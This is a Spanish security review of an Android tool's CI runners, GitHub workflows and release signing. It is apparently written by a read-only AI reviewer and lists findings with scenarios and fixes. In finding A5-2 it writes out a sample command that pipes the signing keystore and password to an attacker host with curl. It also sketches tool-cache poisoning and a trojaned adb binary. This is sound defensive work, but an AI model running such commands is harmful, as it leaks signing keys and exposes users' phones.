# Revisión de seguridad v1, área A5: CI, runners y releases

Revisor: adbuddy-reviewer-opus (solo lectura). Base: origin/main 29533dc (el árbol de fix/guard-imagewallpaper es idéntico en `.github/`, `scripts/` y `docs/ci-self-hosted.md`). No se ha ejecutado ningún workflow, adb ni emulador.

## Veredicto: ⚠️

El endurecimiento de puffin (ci/hardening-a5) cierra lo que se puede cerrar desde los workflows: no hay `pull_request_target`, `workflow_run` ni inputs de `workflow_dispatch`; ningún `${{ github.event.* }}` se interpola en un `run:`; `persist-credentials: false` en todos los checkouts; `permissions` mínimos por workflow/job; las 12 acciones están fijadas por SHA (comprobado con `git ls-remote`: todas coinciden con su tag upstream); la firma va en un job aparte sin código de terceros. Lo que queda abierto es de despliegue y procedimiento: el runner Windows corre hoy con la cuenta del usuario, que la propia doc declara requisito no cumplido, y la protección de la clave de firma depende por completo de un revisor humano que GitHub no da en un repo privado del plan gratuito.

## Ya cubierto (no se repite)

- Guarda de forks en todos los jobs con variable `CI_*`; doc §6 explica que no es barrera (el PR ejecuta sus propios workflows) y que la barrera es repo privado + "Run workflows from fork pull requests" desactivado.
- `emulator.sh`: servidor adb propio (rechaza 5037/5038), `ADB_MDNS=0`, `unset ADB_SERVER_SOCKET ANDROID_ADB_SERVER_ADDRESS`, falla cerrado si ve otro dispositivo, comprueba el AVD. Puertos 5590/5591 fuera del barrido de emuladores (5554-5585) del adb del usuario.
- `emutest` rechaza `ANDROID_ADB_SERVER_PORT` 5037/5038 (`host/internal/emutest/emulator_test.go:45`); `adb.Runner` descarta `ANDROID_SERIAL`, `ANDROID_ADB_SERVER_*` y `ADB_SERVER_SOCKET` heredados (`host/internal/adb/adb.go:218`).
- Los tests del host usan adb falso; los que tocan agentes reales o el emulador se saltan sin su variable (`ADBUDDY_REAL_CLAUDE`, `ADBUDDY_MKSH_SERIAL`...).
- Home propio en las celdas Windows self-hosted de `host.yml` (mitigación, no barrera; doc §6).
- `sha_pinning_required`, `allowed_actions=selected`, token por defecto de solo lectura (doc §6 "Repository settings").
- `release.yml` solo en GitHub-hosted, secretos solo en el paso que firma, keystore con `umask 077` + `trap` + paso `always()` de borrado, contraseña por `env:`; `release-key.sh` no imprime el keystore ni pone la contraseña en argv y rechaza carpetas dentro de un repo.
- `install.sh`: HTTPS obligatorio en primer salto y redirecciones, versión validada por regex, `main` al final (descarga cortada no ejecuta nada), `mktemp -d` + trap, extracción de un solo miembro. La falta de firma/procedencia (checksums del mismo origen) está aplazada a M6c (spec M6a línea 42, `docs/releasing.md` "Later").
- Runners fuera antes de hacer público el repo (`docs/pre-public-checklist.md:25`).

## Hallazgos

### A5-1 (alto, abierto): el runner Windows corre con la cuenta del usuario, contra el requisito de la propia doc

- Dónde: `docs/ci-self-hosted.md:285` exige una cuenta Windows dedicada "while agents push branches"; el ledger `.superpowers/sdd/2026-10-02-ci-runner-local/progress.md:5` registra "runner Windows como proceso en primer plano con el usuario actual".
- Escenario: un agente local engañado (doc §6, línea 298) añade en una rama un test Go o una tarea Gradle y abre PR. `host.yml`/`android.yml`/`emulator.yml` lo ejecutan en el runner como el usuario. El código llama a `adb` (en el PATH del runner: `.path` se genera desde el PATH del usuario) sin `ANDROID_ADB_SERVER_PORT`: llega al servidor 5037 del usuario, ya conectado al móvil, o lee `%USERPROFILE%\.android\adbkey` y empareja su propio servidor por mDNS. Ejecuta lo que quiera en el móvil sin clasificador, diario ni confirmación: justo lo que ADBuddy promete evitar. Además: SSH, token de gh, Credential Manager, credenciales de los agentes y `~/.adbuddy-release/release.p12` (cifrado con su contraseña).
- Agravante de la doc: el requisito de la línea 285 nombra `CI_HOST_MATRIX` y `CI_RUNNER_EMULATOR`, pero no `CI_RUNNER_ANDROID`, que el ejemplo de la línea 33 también pone en Windows y que ejecuta Gradle y los tests unitarios de la rama igual (y sin el paso de home propio de `host.yml`).
- Arreglo mínimo: hasta tener la cuenta dedicada, no dejar ninguna variable `CI_*` apuntando al runner Windows mientras los agentes empujan ramas (o parar `run.cmd` cuando no se esté vigilando); añadir `CI_RUNNER_ANDROID` a la frase del requisito.

### A5-2 (alto, latente hasta que existan los secretos): la clave de firma solo la protege un revisor humano que hoy no se puede configurar

- Dónde: `.github/workflows/release.yml:135-168`, `docs/releasing.md:17-26`, `docs/ci-self-hosted.md:359-360`.
- Hecho: en un `push` de etiqueta, GitHub usa el `release.yml` del commit etiquetado. La comprobación "the tag is on main" (`release.yml:39-45`) vive en ese mismo fichero, así que un commit de rama con un `release.yml` editado se la salta. La regla de despliegue del environment (`v*`) filtra el nombre de la etiqueta, no su commit. El ruleset de etiquetas reserva `v*` a administradores, pero los agentes empujan con las credenciales del usuario, que es administrador: no los frena. Queda solo el revisor obligatorio. Según `ci-self-hosted.md:360`, los rulesets no existen en el plan gratuito con repo privado, y tampoco las reglas de protección de environments en repos privados. Si se crea el environment `release` sin revisor (o lo auto-crea la primera ejecución, porque `environment: release` crea uno sin protección), o si por falta de environments se meten como secretos del repositorio, cualquier rama los lee.
- Escenario: agente engañado -> rama con `release.yml` cuyo job `sign` hace `printf %s "$KS:$KS_PASS" | curl -d @- https://atacante` -> `git tag v0.0.99 && git push origin v0.0.99`. Sin revisor, o con un revisor que aprueba por costumbre, la clave se filtra. Según `releasing.md` §"If the key leaks", eso obliga a cada usuario a desinstalar la app.
- Arreglo mínimo: (1) en `releasing.md`, no crear los secretos hasta que el environment tenga revisor obligatorio efectivo (repo público o plan que lo permita) y nunca como secretos de repositorio; (2) añadir al paso 5 de "Cutting a release" que, antes de aprobar `sign`, se compruebe en la pantalla de aprobación que el SHA de la ejecución es un commit de `main` (`git merge-base --is-ancestor <sha> origin/main`) y que `git diff <etiqueta anterior> <sha> -- .github/workflows/release.yml` está vacío o revisado; (3) opcional: que `sign` dependa también de `version` en `needs`, para que un fallo de la comprobación de main no deje nunca un `sign` pendiente de aprobar con el fichero original (hoy depende solo por transitividad vía `build-apk`, correcto, pero frágil ante ediciones).

### A5-3 (medio): la cuenta dedicada no basta si comparte un SDK o un JDK con permisos de escritura; hoy los jobs escriben en el SDK del usuario

- Dónde: `docs/ci-self-hosted.md:96-104` (`ANDROID_HOME=C:/path/to/android-sdk`, sin decir que sea uno propio) y los pasos `sdkmanager` de `android.yml:41-45` y `emulator.yml:82-98,123-127`.
- Escenario: con `ANDROID_HOME` apuntando al SDK del usuario, una rama sustituye `platform-tools/adb.exe` (o `emulator.exe`) y el cambio persiste. La próxima vez que el usuario o `adbuddy serve` usan ese adb con el móvil, ejecutan el troyano, que ve y modifica todo lo que pasa por adb. Con una cuenta dedicada pasaría lo mismo si se le diera escritura en ese SDK para que funcione `sdkmanager`.
- Arreglo mínimo: en §3 y en el requisito de §6, indicar que el runner use su propio SDK, JDK y Go (dentro de la carpeta del runner o del perfil de la cuenta dedicada) y que la cuenta del usuario no ejecute nunca nada de esas rutas. Verificar que el `ANDROID_HOME` del `.env` actual no es el SDK que usa ADBuddy.

### A5-4 (medio): Gradle sin verificación de dependencias en el build que se firma con la clave real

- Dónde: `release.yml:101-131` (`build-apk`); `android/` no tiene `gradle/verification-metadata.xml` ni wrapper (Gradle por versión con `setup-gradle`).
- Escenario: un plugin o una dependencia de Maven comprometidos (o sustituidos en un mirror) inyectan código en el APK. `sign` lo firma con la clave real, `release-cert.sh --pinned` pasa (el certificado es el bueno) y `adbuddy setup` lo da por válido. Separar la firma protege la clave, no el contenido del APK.
- Arreglo mínimo: generar `gradle/verification-metadata.xml` (`gradle --write-verification-metadata sha256 ...`) y versionarlo; Gradle lo aplica en modo estricto por defecto, también en `release-check.yml` y `android.yml`. Que lo actualice un humano al cambiar `libs.versions.toml`.

### A5-5 (bajo): persistencia entre jobs en el runner Windows, sin documentar

- Dónde: `docs/ci-self-hosted.md:317` lo dice solo para el runner Linux.
- Escenario: una rama envenena `_work/_tool` (Go y JDK de `setup-go`/`setup-java`), `GOMODCACHE`/`GOCACHE`/`GRADLE_USER_HOME` en la carpeta del runner, o los `.env`/`.path` del runner (los escribe el mismo usuario). Los jobs posteriores, también los de `push` a `main`, corren con esas herramientas: se puede fabricar un verde en `main` u ocultar un fallo.
- Arreglo mínimo: copiar el párrafo de persistencia a la sección de Windows y, con la cuenta dedicada, que `.env`, `.path` y `bin/` del runner no sean escribibles por esa cuenta (propietario: administrador).

### A5-6 (bajo): dos runners en la misma máquina chocan en el job del emulador

- Dónde: `emulator.yml:25-27` (`group: emulator-${{ github.ref }}`) con puertos fijos 5590/5049 y AVD fijo; `ci-self-hosted.md:323` invita a registrar un segundo runner para paralelizar.
- Escenario: dos PR a la vez en dos runners del PC: el `stop` de uno mata el emulador y el servidor adb del otro, y el `start` del segundo acepta el emulador del primero (mismo nombre de AVD), así que una PR se valida contra el emulador de otra. Es integridad del resultado, no acceso al móvil: el servidor adb sigue siendo el propio.
- Arreglo mínimo: `group: emulator-${{ vars.CI_RUNNER_EMULATOR || github.ref }}` (una cola por runner configurado) o un grupo fijo `emulator` con `cancel-in-progress: false`; o avisar en §6 de que el job del emulador no admite dos runners en la misma máquina.

### A5-7 (bajo): `ADB_SERVER_SOCKET`/`ANDROID_ADB_SERVER_ADDRESS` fuera de la lista mínima de la doc y del paso de diagnóstico

- Dónde: `docs/ci-self-hosted.md:286` (la lista mínima solo nombra `ADBUDDY_*`, `ANDROID_SERIAL` y `ANDROID_ADB_SERVER_PORT`); `emulator.yml:163-173` (diagnóstico Windows: fija el puerto pero no quita esas dos).
- Escenario: si la consola que lanza `run.cmd` tiene `ADB_SERVER_SOCKET=tcp:5037`, el `adb devices -l` del diagnóstico consulta el servidor del usuario y lista su móvil (con el serial) en el log del job. Solo lectura, pero el serial acaba en los logs de Actions. `emulator.sh` y `adb.Runner` ya las quitan.
- Arreglo mínimo: añadir las dos variables a la lista mínima y `unset ADB_SERVER_SOCKET ANDROID_ADB_SERVER_ADDRESS` al principio de los dos pasos de diagnóstico.

### A5-8 (bajo): sin Dependabot para las acciones fijadas

- Dónde: `.github/` (no hay `dependabot.yml`). Hay majors mezcladas: checkout v4/v5/v7, setup-go v6/v7, setup-java v4/v6, setup-gradle v4/v6.
- Riesgo: los SHA fijados no reciben correcciones de seguridad. Si se añade Dependabot, sus PR son ramas del propio repo y pasan la guarda (doc línea 296): ejecutarían en el runner propio código de dependencias recién actualizadas.
- Arreglo mínimo: `dependabot.yml` solo para `github-actions`, y en las guardas de los jobs con runner propio añadir `&& github.actor != 'dependabot[bot]'`.

### A5-9 (informativo)

- `release.p12` en `~/.adbuddy-release` lo puede leer cualquier proceso del usuario (agentes y, hoy, el runner, ver A5-1). Solo lo protege la contraseña de PKCS12. Conviene que `releasing.md` pida que la contraseña viva solo en el gestor de contraseñas, nunca en un fichero del perfil.
- `install.sh:89-91`: `cp` a `$dir/.adbuddy.new` sigue un enlace simbólico preexistente; solo importa si `ADBUDDY_INSTALL_DIR` es un directorio escribible por otros (no lo es el predeterminado). Se puede usar `mktemp "$dir/.adbuddy.XXXXXX"`.
- CODEOWNERS: no aporta nada con un solo mantenedor. La protección de ramas está documentada como imposible en el plan actual (`ci-self-hosted.md:360`) y prevista para cuando el repo sea público (`releasing.md:22-26`).

## Valoración

En los workflows no hay inyección, ni código de PR con permisos de escritura o secretos, ni acciones sin fijar. Los dos altos son de despliegue y procedimiento, no de YAML: A5-1 es hoy la vía más directa del área al móvil del usuario sin pasar por ADBuddy, y la doc ya lo reconoce como requisito incumplido. A5-2 no se puede explotar mientras no existan los secretos, pero hay que cerrarlo en la doc antes de crearlos.